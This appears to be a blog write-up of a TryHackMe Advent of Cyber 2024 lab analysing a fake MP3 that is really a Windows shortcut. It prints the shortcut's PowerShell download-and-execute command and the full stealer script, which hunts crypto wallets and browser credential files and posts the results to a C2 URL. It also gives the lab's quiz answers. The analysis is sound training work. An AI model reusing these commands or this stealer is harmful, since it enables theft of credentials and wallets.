---
layout: post
title: "TryHackMe Advent of Cyber Day 1"
date: 2024-12-1 11:00:00 -0600
categories: AoC2024
author: Tiny Warrior
tags: ['AoC2024', 'OPSec']
excerpt_separator: <!--more-->
---

Advent of Cyber is a yearly event put on by the folks at [TryHackMe](https://tryhackme.com). This post will cover the solutions for day one.

<!--more-->

- [Scenario](#scenario)
- [Questions](#questions)
- [Answers](#answers)
- [Explanations](#explanations)

## Scenario

Today's scenario covers the discovery of a malicious YouTube to MP3 Converter website. This website was distributing malware and it was up to us to figure out how.

The site allows you to provide a YouTube URL and it will provide you with MP3 and MP4 versions of the YouTube video.

![Website Screenshot](/assets/images/aoc2024_1_1.png)

Using the example YouTube URL provided, the site generated a download.zip file for us. This zip file contained two files:

```bash
┌──(tiny㉿kali)-[/mnt/…/THM/AoC/2024/day_01]
└─$ unzip download.zip 
Archive:  download.zip
 extracting: song.mp3                
 extracting: somg.mp3
```

`somg.mp3` is immediately suspicious due to the misspelling. File extensions provide helpful hints as what type of file we are working with.  In the end, the file metadata is the source of truth. The `file` command on *nix operating systems provides insight the type of file we actually have.

```bash
┌──(tiny㉿kali)-[/mnt/…/THM/AoC/2024/day_01]
└─$ file somg.mp3 
somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Unicoded, MachineID win-base-2019, EnableTargetMetadata KnownFolderID 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7, Archive, ctime=Sat Sep 15 13:14:14 2018, atime=Sat Sep 15 13:14:14 2018, mtime=Sat Sep 15 13:14:14 2018, length=448000, window=normal, IDListSize 0x020d, Root folder "20D04FE0-3AEA-1069-A2D8-08002B30309D", Volume "C:\", LocalBasePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
```

In the output from file, it is very obvious that this isn't an MP3 and is in fact a `.lnk` file which Windows uses for shortcuts. The file also appears to have references to PowerShell which is not normal for these files. We can explore the file more in-depth with ` exiftool`.

```bash
┌──(tiny㉿kali)-[/mnt/…/THM/AoC/2024/day_01]
└─$ exiftool somg.mp3 
ExifTool Version Number         : 13.00
File Name                       : somg.mp3
Directory                       : .
File Size                       : 2.2 kB
File Modification Date/Time     : 2024:10:30 14:32:52-06:00
File Access Date/Time           : 2024:12:01 12:05:47-06:00
File Inode Change Date/Time     : 2024:10:30 14:32:52-06:00
File Permissions                : -rwxr-xr-x
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
Flags                           : IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, Unicode, TargetMetadata
File Attributes                 : Archive
Create Date                     : 2018:09:15 01:14:14-06:00
Access Date                     : 2018:09:15 01:14:14-06:00
Modify Date                     : 2018:09:15 01:14:14-06:00
Target File Size                : 448000
Icon Index                      : (none)
Run Window                      : Normal
Hot Key                         : (none)
Target File DOS Name            : powershell.exe
Drive Type                      : Fixed Disk
Drive Serial Number             : A8A4-C362
Volume Label                    : 
Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
```

Inside of the `exiftool` output, we can find the PowerShell that is being run. The code downloads another bit of PowerShell, copies it to `C:\ProgramData\s.ps1` and executes it. The full PowerShell payload is in the [Explanations](#question-two) section below.

Now we have everything we need to answer the questions for today's challenges.

## Questions

1. Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author? 
1. The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?
1. Who is M.M? Maybe his Github profile page would provide clues?
1. What is the number of commits on the GitHub repo where the issue was raised?
    
## Answers
1. Tyler Ramsbey
1. (defanged) - hxxp[://]papash3ll[.]thm/data
1. Mayor Malware
1. 1(one)


## Explanations

#### Question One
**exiftool** is an amazing tool for exploring file metadata. When we run it on the legitimate file(song.mp3) we can see who the artist who created this recording was.

```bash
┌──(tiny㉿kali)-[/mnt/…/THM/AoC/2024/day_01]
└─$ exiftool song.mp3            
ExifTool Version Number         : 13.00
File Name                       : song.mp3
Directory                       : .
File Size                       : 4.6 MB
File Modification Date/Time     : 2024:10:24 09:50:46-06:00
File Access Date/Time           : 2024:12:01 10:49:47-06:00
File Inode Change Date/Time     : 2024:10:24 09:50:46-06:00
File Permissions                : -rwxr-xr-x
File Type                       : MP3
File Type Extension             : mp3
MIME Type                       : audio/mpeg
MPEG Audio Version              : 1
Audio Layer                     : 3
Audio Bitrate                   : 192 kbps
Sample Rate                     : 44100
Channel Mode                    : Stereo
MS Stereo                       : Off
Intensity Stereo                : Off
Copyright Flag                  : False
Original Media                  : False
Emphasis                        : None
ID3 Size                        : 2176
Artist                          : Tyler Ramsbey
Album                           : Rap
Title                           : Mount HackIt
Encoded By                      : Mixcraft 10.5 Recording Studio Build 621
Year                            : 2024
Genre                           : Rock
Track                           : 0/1
Comment                         : 
Date/Time Original              : 2024
Duration                        : 0:03:11 (approx)
```

#### Question Two
The downloaded PowerShell from GitHub appears to be malware. This malware attempts to steal information from common browsers. Once it has extracted the information,  it uploads it to a Command and Control(C2) server. In the `Send-InfoToC2Server` function you can find the URL of the C2 server.

```powershell
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

# Function to search for browser credential files (SQLite databases)
function Search-ForBrowserCredentials {
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"

    Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
    if (Test-Path $chromePath) {
        Add-Content -Path $infoFilePath -Value "Found Chrome credentials: $chromePath"
    }
    if (Test-Path $firefoxPath) {
        Add-Content -Path $infoFilePath -Value "Found Firefox credentials: $firefoxPath"
    }
}

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

# Main execution flow
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server
```
#### Question Three
The PowerShell script contains a unique signature `"Created by the one and only M.M."`. We can search for this signature on GitHub to see if we can find any other references to it.

![GitHub Search Results](/assets/images/aoc2024_1_2.png)

Exploring the results we can find the user who created this issue: `Mayor-WarevilleTHM`. 

Exploring his [profile](https://github.com/MM-WarevilleTHM/), we find a [repository](https://github.com/MM-WarevilleTHM/M.M) that contains his name.

#### Question Four
Going back to the original repository where the issue was raised and viewing the code page, we can see there was only one commit to this repository.

![Commit Information](/assets/images/aoc2024_1_3.png)
